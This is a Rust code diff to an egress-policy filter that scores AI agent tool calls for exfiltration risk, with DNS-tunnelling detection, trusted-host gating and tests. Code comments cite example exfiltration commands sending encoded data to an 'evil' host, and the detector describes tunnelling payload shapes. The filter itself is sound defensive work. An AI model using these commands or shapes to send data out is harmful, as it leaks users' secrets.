@@ -200,6 +200,36 @@ impl EgressPolicyFilter {
             .any(|domain| host == *domain || host.ends_with(&format!(".{domain}")))
     }
 
+    /// True when `host` is an operator-configured trusted domain or one of the
+    /// resolved profile's trusted destinations. Used to gate exfil-shape
+    /// scoring on spawned URL tools: a signed / token-bearing URL to a routine
+    /// host (a presigned S3 link, an OAuth bearer, a `raw.githubusercontent.com`
+    /// commit-SHA path) is expected and must not be scored, so the check adds no
+    /// approvals on the trusted-destination happy path.
+    fn is_trusted_host(&self, host: &str, profile_trusted: Option<&HashSet<String>>) -> bool {
+        Self::domain_matches(&self.trusted_domains, host)
+            || profile_trusted.is_some_and(|domains| Self::domain_matches(domains, host))
+    }
+
+    /// True when `host` is trusted for review-suppression purposes: an
+    /// operator/profile trusted domain, or — when the operator permits
+    /// private-IP egress (`allow_private_ip = true`, the default) — a
+    /// private/loopback host. A headless-browser or curl invocation against
+    /// a loopback dev server is local development, not egress to review;
+    /// the bare-token scanner already treats private/loopback IPs as local
+    /// (`command_has_untrusted_bare_destination`), so this extends the same
+    /// judgement to `scheme://` URL destinations. With
+    /// `allow_private_ip = false` the earlier `private-address-egress` rule
+    /// keeps full coverage.
+    fn is_trusted_or_allowed_local(
+        &self,
+        host: &str,
+        profile_trusted: Option<&HashSet<String>>,
+    ) -> bool {
+        self.is_trusted_host(host, profile_trusted)
+            || (self.allow_private_ip && is_private_or_local_host(host))
+    }
+
     fn parse_url_destination(url: &str) -> Option<Destination> {
         let (scheme, rest) = url.split_once("://")?;
         if scheme.is_empty() {
@@ -276,7 +306,7 @@ impl EgressPolicyFilter {
             if self.blocked_schemes.contains(scheme) {
                 let score = self.blocked_score();
                 return Some(FilterResult::matched(
-                    "egress_policy",
+                    "egress-policy",
                     "blocked-scheme",
                     score,
                     severity_for(score),
@@ -288,7 +318,7 @@ impl EgressPolicyFilter {
         if Self::domain_matches(&self.blocked_domains, &dest.host) {
             let score = self.blocked_score();
             return Some(FilterResult::matched(
-                "egress_policy",
+                "egress-policy",
                 "blocked-domain",
                 score,
                 severity_for(score),
@@ -300,7 +330,7 @@ impl EgressPolicyFilter {
             if self.blocked_ports.contains(&port) {
                 let score = self.blocked_score();
                 return Some(FilterResult::matched(
-                    "egress_policy",
+                    "egress-policy",
                     "blocked-port",
                     score,
                     severity_for(score),
@@ -312,7 +342,7 @@ impl EgressPolicyFilter {
         if !self.allow_private_ip && is_private_or_local_host(&dest.host) {
             let score = self.review_score();
             return Some(FilterResult::matched(
-                "egress_policy",
+                "egress-policy",
                 "private-address-egress",
                 score,
                 severity_for(score),
@@ -327,7 +357,7 @@ impl EgressPolicyFilter {
             if self.review_schemes.contains(scheme) {
                 let score = self.review_score();
                 return Some(FilterResult::matched(
-                    "egress_policy",
+                    "egress-policy",
                     "review-scheme",
                     score,
                     severity_for(score),
@@ -345,7 +375,7 @@ impl EgressPolicyFilter {
             if self.review_ports.contains(&port) && source != "dns_query" {
                 let score = self.review_score();
                 return Some(FilterResult::matched(
-                    "egress_policy",
+                    "egress-policy",
                     "review-port",
                     score,
                     severity_for(score),
@@ -356,7 +386,7 @@ impl EgressPolicyFilter {
 
         if Self::domain_matches(&self.trusted_domains, &dest.host) {
             return Some(FilterResult::matched(
-                "egress_policy",
+                "egress-policy",
                 "trusted-destination",
                 -1.0,
                 Severity::Notice,
@@ -367,7 +397,7 @@ impl EgressPolicyFilter {
         if let Some(profile_domains) = profile_trusted {
             if Self::domain_matches(profile_domains, &dest.host) {
                 return Some(FilterResult::matched(
-                    "egress_policy",
+                    "egress-policy",
                     "profile-trusted-destination",
                     -1.0,
                     Severity::Notice,
@@ -380,6 +410,18 @@ impl EgressPolicyFilter {
         }
 
         if self.review_unknown_destinations {
+            // A private/loopback host is not an *unknown* destination when the
+            // operator allows private-IP egress (`allow_private_ip = true`, the
+            // default): "unknown" is a statement about internet hosts we cannot
+            // vouch for, not the user's own dev server on localhost. Without
+            // this carveout a spawn/connect carrying `http://localhost:<port>/`
+            // queued at the full review score even though the
+            // `private-address-egress` gate above deliberately let it through.
+            // With `allow_private_ip = false`, private hosts never reach this
+            // branch (private-address-egress returns above).
+            if self.allow_private_ip && is_private_or_local_host(&dest.host) {
+                return None;
+            }
             // FP §5.9: a DnsQuery to an unknown host is routine on its own —
             // name resolution of a transitive dependency or redirect target.
             // Emit it as a sub-threshold forensic signal rather than a review:
@@ -402,7 +444,7 @@ impl EgressPolicyFilter {
                 severity_for(score)
             };
             return Some(FilterResult::matched(
-                "egress_policy",
+                "egress-policy",
                 "unknown-destination",
                 score,
                 severity,
@@ -411,6 +453,48 @@ impl EgressPolicyFilter {
         }
 
         None
+    }
+
+    /// Evaluate every candidate hostname from an ambiguous shared-IP DNS
+    /// attribution and return the worst-case result.
+    ///
+    /// "Worst case" ranks by effective score, where a candidate the filter
+    /// has no opinion on (`None`) counts as 0.0. That makes `None` outrank a
+    /// negative (trusted) result, so a mixed candidate set never inherits
+    /// another candidate's trusted credit; only a set where every candidate
+    /// scores negative keeps the -1.0. Positive-scoring results carry the
+    /// full candidate list in their message so the operator prompt shows why
+    /// a name they trust is implicated.
+    ///
+    /// The caller guarantees `candidates` is non-empty
+    /// (`parse_dns_candidate_array` rejects empty arrays).
+    fn evaluate_worst_case_candidate(
+        &self,
+        candidates: &[String],
+        port: u16,
+        profile_trusted: Option<&HashSet<String>>,
+    ) -> Option<FilterResult> {
+        let mut worst: Option<Option<FilterResult>> = None;
+        for candidate in candidates {
+            let dest = Self::parse_net_destination(candidate, port);
+            let result = self.evaluate_destination(&dest, "net_connect", profile_trusted);
+            let score = result.as_ref().map_or(0.0, |r| r.score);
+            let worst_score = worst
+                .as_ref()
+                .map(|prior| prior.as_ref().map_or(0.0, |r| r.score));
+            if worst_score.is_none_or(|prior| score > prior) {
+                worst = Some(result);
+            }
+        }
+        let mut result = worst.flatten()?;
+        if result.score > 0.0 {
+            result.message = format!(
+                "{} (ambiguous shared-IP DNS attribution; candidates: {})",
+                result.message,
+                candidates.join(", ")
+            );
+        }
+        Some(result)
     }
 
     /// Evaluate protocol-specific risk signals on a string (URL, command args, etc.).
@@ -429,7 +513,7 @@ impl EgressPolicyFilter {
             best = Self::select_higher_risk(
                 best,
                 Some(FilterResult::matched(
-                    "egress_policy",
+                    "egress-policy",
                     "suspicious-length",
                     score,
                     severity_for(score),
@@ -448,7 +532,7 @@ impl EgressPolicyFilter {
                 best = Self::select_higher_risk(
                     best,
                     Some(FilterResult::matched(
-                        "egress_policy",
+                        "egress-policy",
                         "base64-chunking",
                         score,
                         severity_for(score),
@@ -472,7 +556,7 @@ impl EgressPolicyFilter {
                 best = Self::select_higher_risk(
                     best,
                     Some(FilterResult::matched(
-                        "egress_policy",
+                        "egress-policy",
                         "high-entropy-segment",
                         score,
                         severity_for(score),
@@ -504,7 +588,7 @@ impl EgressPolicyFilter {
             {
                 let score = self.review_score();
                 return Some(FilterResult::matched(
-                    "egress_policy",
+                    "egress-policy",
                     "unusual-port",
                     score,
                     severity_for(score),
@@ -539,7 +623,7 @@ impl EgressPolicyFilter {
             if basenames.iter().any(|b| b.eq_ignore_ascii_case(token)) {
                 let score = self.blocked_score();
                 return Some(FilterResult::matched(
-                    "egress_policy",
+                    "egress-policy",
                     "blocked-egress-command-token",
                     score,
                     severity_for(score),
@@ -563,7 +647,7 @@ impl EgressPolicyFilter {
                 }
                 let score = self.review_score();
                 return Some(FilterResult::matched(
-                    "egress_policy",
+                    "egress-policy",
                     "review-egress-command-token",
                     score,
                     severity_for(score),
@@ -599,8 +683,12 @@ impl EgressPolicyFilter {
         }
         let is_trusted = |host: &str| {
             let host = host.to_lowercase();
-            Self::domain_matches(&self.trusted_domains, &host)
-                || prof_trusted.is_some_and(|p| Self::domain_matches(p, &host))
+            // Allowed-local counts as trusted here for the same reason it does
+            // in the destination loops: `curl http://localhost:3000/api`
+            // against the operator's own dev server is routine local
+            // development when `allow_private_ip` is on, not an egress fetch
+            // worth queueing.
+            self.is_trusted_or_allowed_local(&host, prof_trusted)
         };
         dests.iter().all(|d| is_trusted(&d.host))
             && !self.command_has_untrusted_bare_destination(command, &is_trusted)
@@ -674,7 +762,7 @@ impl EgressPolicyFilter {
 #[async_trait::async_trait]
 impl SecurityFilter for EgressPolicyFilter {
     fn name(&self) -> &str {
-        "egress_policy"
+        "egress-policy"
     }
 
     fn phase(&self) -> FilterPhase {
@@ -683,6 +771,14 @@ impl SecurityFilter for EgressPolicyFilter {
 
     async fn evaluate(&self, ctx: &ToolCallContext) -> crate::error::Result<FilterResult> {
         let mut best: Option<FilterResult> = None;
+        // C2: track whether *any* exfil-shape signal fired (base64/high-entropy/
+        // suspicious-length/DNS-tunnelling), even when a higher-scored signal
+        // (unknown-destination, command-token) wins the collapsed result. Stamped
+        // as `exfil_shape` metadata so the precision meta-rule can combine it with
+        // reputation / taint across filters — the shape alone only fires here for
+        // untrusted destinations (W1 trust-gate), so its mere presence already
+        // means "shaped payload to a host we don't trust".
+        let mut exfil_shape = false;
 
         // Resolve per-profile trusted domains for this context.
         let prof_trusted = ctx
@@ -692,17 +788,36 @@ impl SecurityFilter for EgressPolicyFilter {
 
         match &ctx.call_type {
             ToolCallType::HttpRequest { url, .. } => {
-                if let Some(dest) = Self::parse_url_destination(url) {
+                let dest = Self::parse_url_destination(url);
+                // Untrusted when the host is unknown or the URL won't parse; a
+                // trusted (or allowed-local) host detects the shape (for C2)
+                // but does not standalone-score it.
+                let untrusted = dest
+                    .as_ref()
+                    .is_none_or(|d| !self.is_trusted_or_allowed_local(&d.host, prof_trusted));
+                if let Some(dest) = &dest {
                     best = Self::select_higher_risk(
                         best,
-                        self.evaluate_destination(&dest, "http_request", prof_trusted),
+                        self.evaluate_destination(dest, "http_request", prof_trusted),
                     );
                     best = Self::select_higher_risk(
                         best,
-                        self.evaluate_unusual_port(&dest, "http_request"),
+                        self.evaluate_unusual_port(dest, "http_request"),
                     );
                 }
-                best = Self::select_higher_risk(best, self.evaluate_protocol_signals(url, "url"));
+                // W2: shape-score the full URL (path+query). The score is added
+                // only for an untrusted destination — a signed/token URL to a
+                // trusted host must not queue on its own — but the exfil_shape
+                // flag is set whenever a shape rides a real destination, so C2
+                // can still escalate a shaped payload to a trusted host when
+                // reputation/taint corroborates.
+                let shape = self.evaluate_protocol_signals(url, "url");
+                if dest.is_some() && shape.is_some() {
+                    exfil_shape = true;
+                }
+                if untrusted {
+                    best = Self::select_higher_risk(best, shape);
+                }
             }
             ToolCallType::NetConnect { address, port } => {
                 if address.starts_with("raw:") {
@@ -711,27 +826,46 @@ impl SecurityFilter for EgressPolicyFilter {
                     // arbitrary Ethernet frames. Score unconditionally high so the
                     // call lands well above the deny threshold regardless of mode.
                     return Ok(FilterResult::matched(
-                        "egress_policy",
+                        "egress-policy",
                         "raw-socket",
                         7.0,
                         severity_for(7.0),
                         format!("Raw socket ({address}): can exfiltrate data bypassing IP stack"),
                     ));
                 }
-                let dest = Self::parse_net_destination(address, *port);
+                // Ambiguous shared-IP DNS attribution renders the address as
+                // a JSON hostname array (`["a.example","b.example"]`): the IP
+                // is shared CDN infrastructure and the tenant actually reached
+                // is selected by SNI/Host after connect(2), which we never
+                // see. Score the call as if it could reach ANY candidate:
+                // evaluate each independently and keep the worst-case result.
+                // The trusted-destination credit therefore applies only when
+                // every candidate earns it, and a blocked candidate escalates
+                // the whole call even when a trusted name shares the IP.
+                let destination_result = match crate::types::parse_dns_candidate_array(address) {
+                    Some(candidates) => {
+                        self.evaluate_worst_case_candidate(&candidates, *port, prof_trusted)
+                    }
+                    None => {
+                        let dest = Self::parse_net_destination(address, *port);
+                        self.evaluate_destination(&dest, "net_connect", prof_trusted)
+                    }
+                };
+                best = Self::select_higher_risk(best, destination_result);
+                // Port risk is host-independent; one check covers every
+                // candidate.
                 best = Self::select_higher_risk(
                     best,
-                    self.evaluate_destination(&dest, "net_connect", prof_trusted),
-                );
-                best = Self::select_higher_risk(
-                    best,
-                    self.evaluate_unusual_port(&dest, "net_connect"),
+                    self.evaluate_unusual_port(
+                        &Self::parse_net_destination(address, *port),
+                        "net_connect",
+                    ),
                 );
             }
             ToolCallType::NetListen { address, port } => {
                 if address.starts_with("raw:") {
                     return Ok(FilterResult::matched(
-                        "egress_policy",
+                        "egress-policy",
                         "raw-socket",
                         7.0,
                         severity_for(7.0),
@@ -775,7 +909,7 @@ impl SecurityFilter for EgressPolicyFilter {
                                 // never reaches the network because
                                 // the supervisor rewrites it to
                                 // loopback before `bind(2)`.
-                                return Ok(FilterResult::no_match("egress_policy"));
+                                return Ok(FilterResult::no_match("egress-policy"));
                             }
                             Some(_) => (
                                 "wildcard-bind-declared-no-clamp",
@@ -804,7 +938,7 @@ impl SecurityFilter for EgressPolicyFilter {
                         )
                     };
                     best = Some(FilterResult::matched(
-                        "egress_policy",
+                        "egress-policy",
                         rule_id,
                         5.0,
                         severity_for(5.0),
@@ -819,7 +953,7 @@ impl SecurityFilter for EgressPolicyFilter {
                 best =
                     Self::select_higher_risk(best, self.evaluate_unusual_port(&dest, "net_listen"));
             }
-            ToolCallType::DnsQuery { domain, .. } => {
+            ToolCallType::DnsQuery { domain, query_type } => {
                 let dest = Self::parse_net_destination(domain, 53);
                 // Honours blocked/trusted domains and unknown-destination.
                 // review-port stays suppressed because port 53 is artificial
@@ -828,13 +962,40 @@ impl SecurityFilter for EgressPolicyFilter {
                     best,
                     self.evaluate_destination(&dest, "dns_query", prof_trusted),
                 );
-                // Keep DNS-tunneling detection: a high-entropy / over-long
-                // subdomain still draws a signal (entropy/base64) even though
-                // routine resolution does not.
-                best = Self::select_higher_risk(
-                    best,
-                    self.evaluate_protocol_signals(domain, "dns_query"),
-                );
+                // W4: dedicated DNS-tunnelling sub-signal — encoded/high-entropy
+                // subdomain labels, weighted up for data-bearing query types
+                // (TXT/NULL/CNAME/ANY). Catches base32/hex tunnelling the
+                // base64-only generic scan misses, and — because it runs on the
+                // domain, not the destination — fires even under a trusted
+                // parent zone (the supervisor's allowlist short-circuit defers
+                // to this before allowing a query below an allowlisted parent).
+                // Evaluated before the generic scan so the more informative,
+                // qtype-weighted signal wins on a score tie.
+                if let Some(sig) = dns_tunneling_signal(domain, query_type) {
+                    exfil_shape = true;
+                    let mut score = self.review_score();
+                    if sig.high_risk_qtype {
+                        // Data-bearing query type — the classic exfil channel.
+                        score += 2.0;
+                    }
+                    best = Self::select_higher_risk(
+                        best,
+                        Some(FilterResult::matched(
+                            "egress-policy",
+                            "dns-tunneling",
+                            score,
+                            severity_for(score),
+                            format!("Possible DNS tunnelling in query: {}", sig.reason),
+                        )),
+                    );
+                }
+                // Generic shape scan (base64 runs). The suspicious-*length*
+                // component is inert for DNS (a QNAME is short), so the dedicated
+                // signal above is the primary DNS-tunnelling detector; this
+                // remains as a complementary base64-run catch.
+                let shape = self.evaluate_protocol_signals(domain, "dns_query");
+                exfil_shape |= shape.is_some();
+                best = Self::select_higher_risk(best, shape);
             }
             ToolCallType::ShellExec { .. } => {
                 if let Some(full) = ctx.full_command() {
@@ -842,7 +1003,15 @@ impl SecurityFilter for EgressPolicyFilter {
                         best,
                         self.evaluate_command_tokens(&full, prof_trusted),
                     );
+                    let is_trusted =
+                        |host: &str| self.is_trusted_or_allowed_local(host, prof_trusted);
+                    let mut has_dest = false;
+                    let mut has_untrusted_dest = false;
                     for dest in self.extract_destinations_from_command(&full) {
+                        has_dest = true;
+                        if !is_trusted(&dest.host) {
+                            has_untrusted_dest = true;
+                        }
                         best = Self::select_higher_risk(
                             best,
                             self.evaluate_destination(&dest, "command", prof_trusted),
@@ -852,10 +1021,26 @@ impl SecurityFilter for EgressPolicyFilter {
                             self.evaluate_unusual_port(&dest, "command"),
                         );
                     }
-                    best = Self::select_higher_risk(
-                        best,
-                        self.evaluate_protocol_signals(&full, "command_args"),
-                    );
+                    if !has_untrusted_dest
+                        && self.command_has_untrusted_bare_destination(&full, &is_trusted)
+                    {
+                        has_untrusted_dest = true;
+                    }
+                    if has_untrusted_dest {
+                        has_dest = true;
+                    }
+                    // W2: consistent with ProcessSpawn — shape is scored only for
+                    // an untrusted destination (so a SHA/digest arg or a signed
+                    // URL to a trusted host no longer queues on its own), while
+                    // the exfil_shape flag is set for any shaped payload heading
+                    // to a real destination so C2 can corroborate.
+                    let shape = self.evaluate_protocol_signals(&full, "command_args");
+                    if has_dest && shape.is_some() {
+                        exfil_shape = true;
+                    }
+                    if has_untrusted_dest {
+                        best = Self::select_higher_risk(best, shape);
+                    }
                 }
             }
             ToolCallType::ProcessSpawn { command, args } => {
@@ -864,14 +1049,31 @@ impl SecurityFilter for EgressPolicyFilter {
                 } else {
                     format!("{} {}", command, args.join(" "))
                 };
-                best = Self::select_higher_risk(
-                    best,
-                    self.evaluate_command_tokens(&full, prof_trusted),
-                );
+                // A#3: a Chromium-family browser forking its own `--type=<helper>`
+                // subprocess (renderer/gpu/utility/zygote/crashpad) is an
+                // IPC-connected internal fork, not a fetch — the outbound-command
+                // token would otherwise flag every helper. The MAIN launch (a URL,
+                // no `--type=`) is not a subprocess and is still scored below, and
+                // any real egress by the network-service child is scored at
+                // NetConnect/DnsQuery time.
+                if !is_browser_subprocess_spawn(command, args) {
+                    best = Self::select_higher_risk(
+                        best,
+                        self.evaluate_command_tokens(&full, prof_trusted),
+                    );
+                }
 
                 let arg_text = args.join(" ");
                 if !arg_text.is_empty() {
+                    let is_trusted =
+                        |host: &str| self.is_trusted_or_allowed_local(host, prof_trusted);
+                    let mut has_dest = false;
+                    let mut has_untrusted_dest = false;
                     for dest in self.extract_destinations_from_command(&arg_text) {
+                        has_dest = true;
+                        if !is_trusted(&dest.host) {
+                            has_untrusted_dest = true;
+                        }
                         best = Self::select_higher_risk(
                             best,
                             self.evaluate_destination(&dest, "command", prof_trusted),
@@ -881,12 +1083,56 @@ impl SecurityFilter for EgressPolicyFilter {
                             self.evaluate_unusual_port(&dest, "command"),
                         );
                     }
+                    // Scheme-LESS URL forms (`curl example.com/up?d=<blob>`,
+                    // `wget host/p`) never match the `scheme://` URL regex, so
+                    // the loop above misses them. The bare-destination scanner
+                    // — already trusted for review suppression — recognises an
+                    // untrusted scheme-less host with the same flag /
+                    // consumed-value / local-path / private-IP guards, so it
+                    // also opens the exfil-shape gate. Passed `full` (binary
+                    // included) because the scanner skips token[0] as the
+                    // program name.
+                    if !has_untrusted_dest
+                        && self.command_has_untrusted_bare_destination(&full, &is_trusted)
+                    {
+                        has_untrusted_dest = true;
+                    }
+                    if has_untrusted_dest {
+                        has_dest = true;
+                    }
+                    // Exfil-shape scoring for any spawned tool handed a URL —
+                    // curl, wget, http(ie), aria2c, a headless-browser cmdline,
+                    // a bespoke uploader. A base64 blob / high-entropy segment /
+                    // over-long argument in the argv is *scored* only when the
+                    // spawn targets an UNTRUSTED destination, so it catches
+                    // `curl https://evil/x?d=<blob>` and `curl -d <blob> https://evil`
+                    // without queueing signed requests to trusted hosts. The
+                    // exfil_shape *flag* is set whenever a shape rides a real
+                    // destination (trusted or not) so C2 can escalate a shaped
+                    // payload to a trusted host under reputation/taint; URL-less
+                    // spawns (`git checkout <sha>`, `docker run img@sha256:<hex>`)
+                    // carry no destination, so they set neither.
+                    let shape = self.evaluate_protocol_signals(&arg_text, "command_args");
+                    if has_dest && shape.is_some() {
+                        exfil_shape = true;
+                    }
+                    if has_untrusted_dest {
+                        best = Self::select_higher_risk(best, shape);
+                    }
                 }
             }
             _ => {}
         }
 
-        Ok(best.unwrap_or_else(|| FilterResult::no_match("egress_policy")))
+        let mut result = best.unwrap_or_else(|| FilterResult::no_match("egress-policy"));
+        if exfil_shape {
+            // Visible to the precision meta-rule (C2) and to forensics even when
+            // the winning signal is unknown-destination / command-token.
+            result
+                .metadata
+                .insert("exfil_shape".to_string(), serde_json::Value::Bool(true));
+        }
+        Ok(result)
     }
 }
 
@@ -905,6 +1151,42 @@ fn token_basename(token: &str) -> &str {
         Some((_, basename)) if !basename.is_empty() => basename,
         _ => trimmed,
     }
+}
+
+/// Chromium-family browser binary basenames (A#3). A `--type=` arg on one of
+/// these marks an internal helper-process fork rather than a URL fetch.
+const BROWSER_BINARIES: &[&str] = &[
+    "chrome",
+    "chrome.exe",
+    "google-chrome",
+    "google-chrome-stable",
+    "google-chrome-beta",
+    "google-chrome-unstable",
+    "chromium",
+    "chromium-browser",
+    "msedge",
+    "msedge.exe",
+    "microsoft-edge",
+    "microsoft-edge-stable",
+    "brave",
+    "brave-browser",
+    "opera",
+    "vivaldi",
+    "vivaldi-stable",
+];
+
+/// A#3: true when this spawn is a Chromium-family browser forking one of its own
+/// internal helper processes (`--type=renderer|gpu-process|utility|zygote|
+/// crashpad-handler|…`) or the standalone crashpad-handler binary. These are
+/// IPC-connected child processes, not network egress; the actual egress of the
+/// network-service child is scored at NetConnect/DnsQuery time. The MAIN launch
+/// (a URL, no `--type=`) is NOT a subprocess and is still scored.
+fn is_browser_subprocess_spawn(command: &str, args: &[String]) -> bool {
+    let base = token_basename(command).to_ascii_lowercase();
+    if base.contains("crashpad_handler") {
+        return true;
+    }
+    BROWSER_BINARIES.contains(&base.as_str()) && args.iter().any(|a| a.starts_with("--type="))
 }
 
 fn normalize_vec(values: Vec<String>) -> Vec<String> {
@@ -976,6 +1258,125 @@ fn parse_host_port(authority: &str) -> (String, Option<u16>) {
     }
 
     (authority.to_string(), None)
+}
+
+// ── DNS-tunnelling shape detection (W4) ──────────────────────────────────────
+//
+// DNS exfiltration/tunnelling smuggles data in the subdomain labels of a query
+// (`<base32-chunk>.<chunk>.tunnel.example.com`) or uses data-bearing query types
+// (TXT/NULL) to carry a payload back. Legitimate hostnames are short and
+// low-entropy; encoded payloads are long and high-entropy. These thresholds are
+// deliberately independent of the URL-oriented base64/entropy config — they
+// describe DNS labels, not URLs — and are tuned to lean toward precision (a
+// false trigger on an allowlisted parent only QUEUEs a lookup, it never denies).
+
+/// A single subdomain label at or above this length is unusual for a real
+/// hostname and characteristic of an encoded chunk.
+const DNS_TUNNEL_LABEL_MIN_LEN: usize = 32;
+/// Minimum total length of the subdomain (non-registrable) region for the
+/// multi-label "chunked encoding" trigger.
+const DNS_TUNNEL_SUBDOMAIN_MIN_LEN: usize = 50;
+/// Minimum subdomain length for the *data-bearing query type* trigger, which is
+/// more sensitive because TXT/NULL queries are the classic tunnelling channel.
+const DNS_TUNNEL_QTYPE_SUBDOMAIN_MIN_LEN: usize = 24;
+/// Shannon-entropy floor (bits/char) for a region to read as encoded rather
+/// than a normal (dictionary-ish, low-entropy) hostname. Real tunnels use
+/// base32/base64 (entropy ~4.5–6.0); dictionary subdomains and long service
+/// names sit ~3.5–3.9, so 4.0 separates them cleanly. Hex-encoded tunnels
+/// (~4.0, and space-inefficient over DNS) sit right at the boundary — an
+/// accepted precision/recall trade documented here.
+const DNS_TUNNEL_ENTROPY_THRESHOLD: f64 = 4.0;
+
+/// A detected DNS-tunnelling shape. `high_risk_qtype` is set when the query type
+/// can carry arbitrary data back to the resolver (TXT/NULL/CNAME/ANY) — the
+/// caller weights the score up for those.
+#[derive(Debug, Clone)]
+pub struct DnsTunnelingSignal {
+    pub reason: String,
+    pub high_risk_qtype: bool,
+}
+
+/// DNS query types that can smuggle a data payload back to the client — the
+/// classic tunnelling channels.
+fn is_high_risk_dns_qtype(query_type: &str) -> bool {
+    matches!(
+        query_type.trim().to_ascii_uppercase().as_str(),
+        "TXT" | "NULL" | "CNAME" | "ANY"
+    )
+}
+
+/// Detect a DNS-tunnelling shape in a query name. Returns `Some` when the
+/// subdomain labels look like an encoded payload (long + high-entropy), or when
+/// a data-bearing query type carries a moderately long high-entropy subdomain.
+///
+/// Public so the supervisor's DNS decision path can consult it: a query below an
+/// *allowlisted* parent zone must still be tunnelling-checked before it is
+/// blind-allowed (closing the "tunnel under a trusted parent" hole).
+pub fn dns_tunneling_signal(domain: &str, query_type: &str) -> Option<DnsTunnelingSignal> {
+    let domain = domain.trim().trim_end_matches('.').to_ascii_lowercase();
+    if domain.is_empty() {
+        return None;
+    }
+    let labels: Vec<&str> = domain.split('.').filter(|l| !l.is_empty()).collect();
+    if labels.is_empty() {
+        return None;
+    }
+    let high_risk_qtype = is_high_risk_dns_qtype(query_type);
+
+    // (a) Any single long high-entropy label — a full 63-char-ish encoded chunk.
+    for label in &labels {
+        if label.len() >= DNS_TUNNEL_LABEL_MIN_LEN
+            && shannon_entropy(label) >= DNS_TUNNEL_ENTROPY_THRESHOLD
+        {
+            return Some(DnsTunnelingSignal {
+                reason: format!(
+                    "long high-entropy label ({} chars, entropy {:.2})",
+                    label.len(),
+                    shannon_entropy(label)
+                ),
+                high_risk_qtype,
+            });
+        }
+    }
+
+    // The "subdomain" (non-registrable) region: everything except the last two
+    // labels (a coarse public-suffix approximation — good enough since real
+    // sub.example.com regions are short/low-entropy). Concatenated without dots
+    // so chunked encodings (`aa.bb.cc.…`) are measured as one payload.
+    let sub_end = labels.len().saturating_sub(2);
+    let subdomain: String = labels[..sub_end].concat();
+    if !subdomain.is_empty() {
+        let entropy = shannon_entropy(&subdomain);
+        // (b) Long, high-entropy multi-label subdomain — chunked encoding.
+        if subdomain.len() >= DNS_TUNNEL_SUBDOMAIN_MIN_LEN
+            && entropy >= DNS_TUNNEL_ENTROPY_THRESHOLD
+        {
+            return Some(DnsTunnelingSignal {
+                reason: format!(
+                    "high-entropy multi-label subdomain ({} chars, entropy {entropy:.2})",
+                    subdomain.len()
+                ),
+                high_risk_qtype,
+            });
+        }
+        // (c) Data-bearing query type with a shorter encoded subdomain — TXT/NULL
+        // tunnels can afford smaller labels because the answer carries the load.
+        if high_risk_qtype
+            && subdomain.len() >= DNS_TUNNEL_QTYPE_SUBDOMAIN_MIN_LEN
+            && entropy >= DNS_TUNNEL_ENTROPY_THRESHOLD
+        {
+            return Some(DnsTunnelingSignal {
+                reason: format!(
+                    "{} query with encoded subdomain ({} chars, entropy {entropy:.2})",
+                    query_type.trim().to_ascii_uppercase(),
+                    subdomain.len()
+                ),
+                high_risk_qtype,
+            });
+        }
+    }
+
+    None
 }
 
 /// Shannon entropy in bits per character.
@@ -1355,6 +1756,100 @@ mod tests {
     }
 
     #[tokio::test]
+    async fn ambiguous_candidates_all_trusted_score_trusted() {
+        let mut cfg = EgressPolicyConfig::default();
+        cfg.trusted_domains = vec!["oaiusercontent.com".into()];
+        let filter = EgressPolicyFilter::from_config(cfg);
+        let ctx = make_ctx(ToolCallType::NetConnect {
+            address: r#"["sdmntprsouthcentralus.oaiusercontent.com","sdmntprwestus3.oaiusercontent.com"]"#.into(),
+            port: 443,
+        });
+
+        let result = filter.evaluate(&ctx).await.unwrap();
+        assert!(result.matched);
+        assert_eq!(result.rule_id, "trusted-destination");
+        assert_eq!(result.score, -1.0);
+    }
+
+    #[tokio::test]
+    async fn ambiguous_candidates_mixed_trusted_unknown_keeps_review() {
+        let mut cfg = EgressPolicyConfig::default();
+        cfg.trusted_domains = vec!["oaiusercontent.com".into()];
+        let filter = EgressPolicyFilter::from_config(cfg);
+        let ctx = make_ctx(ToolCallType::NetConnect {
+            address: r#"["cdn.oaiusercontent.com","cotenant-for-test.example"]"#.into(),
+            port: 443,
+        });
+
+        // One untrusted co-tenant on the shared IP must forfeit the trusted
+        // credit: the connection could reach either tenant.
+        let result = filter.evaluate(&ctx).await.unwrap();
+        assert!(result.matched);
+        assert_eq!(result.rule_id, "unknown-destination");
+        assert_eq!(result.score, filter.review_score());
+        assert!(result.message.contains("cotenant-for-test.example"));
+        assert!(result.message.contains("ambiguous shared-IP"));
+    }
+
+    #[tokio::test]
+    async fn ambiguous_candidates_blocked_cotenant_escalates() {
+        let mut cfg = EgressPolicyConfig::default();
+        cfg.trusted_domains = vec!["oaiusercontent.com".into()];
+        cfg.blocked_domains = vec!["evil-for-test.example".into()];
+        let filter = EgressPolicyFilter::from_config(cfg);
+        let ctx = make_ctx(ToolCallType::NetConnect {
+            address: r#"["cdn.oaiusercontent.com","exfil.evil-for-test.example"]"#.into(),
+            port: 443,
+        });
+
+        // Before candidate explosion the array literal matched neither the
+        // blocked nor the trusted list and under-scored as a generic unknown
+        // destination; the blocked co-tenant must win the worst-case fold.
+        let result = filter.evaluate(&ctx).await.unwrap();
+        assert!(result.matched);
+        assert_eq!(result.rule_id, "blocked-domain");
+        assert_eq!(result.score, filter.blocked_score());
+    }
+
+    #[tokio::test]
+    async fn ambiguous_candidates_profile_trusted_all_match() {
+        let mut cfg = EgressPolicyConfig::default();
+        cfg.profile_trusted_domains
+            .insert("codex".into(), vec!["oaiusercontent.com".into()]);
+        let filter = EgressPolicyFilter::from_config(cfg);
+        let ctx = make_ctx_with_profile(
+            ToolCallType::NetConnect {
+                address: r#"["a.oaiusercontent.com","b.oaiusercontent.com"]"#.into(),
+                port: 443,
+            },
+            "codex",
+        );
+
+        let result = filter.evaluate(&ctx).await.unwrap();
+        assert!(result.matched);
+        assert_eq!(result.rule_id, "profile-trusted-destination");
+        assert_eq!(result.score, -1.0);
+    }
+
+    #[tokio::test]
+    async fn malformed_candidate_array_scores_as_unknown_host() {
+        let mut cfg = EgressPolicyConfig::default();
+        cfg.trusted_domains = vec!["oaiusercontent.com".into()];
+        let filter = EgressPolicyFilter::from_config(cfg);
+        // Not valid JSON: degrades to opaque-host handling, which cannot
+        // match a trusted domain and therefore keeps the review score.
+        let ctx = make_ctx(ToolCallType::NetConnect {
+            address: r#"["cdn.oaiusercontent.com""#.into(),
+            port: 443,
+        });
+
+        let result = filter.evaluate(&ctx).await.unwrap();
+        assert!(result.matched);
+        assert_eq!(result.rule_id, "unknown-destination");
+        assert_eq!(result.score, filter.review_score());
+    }
+
+    #[tokio::test]
     async fn test_netconnect_blocked_port() {
         let filter = EgressPolicyFilter::with_defaults();
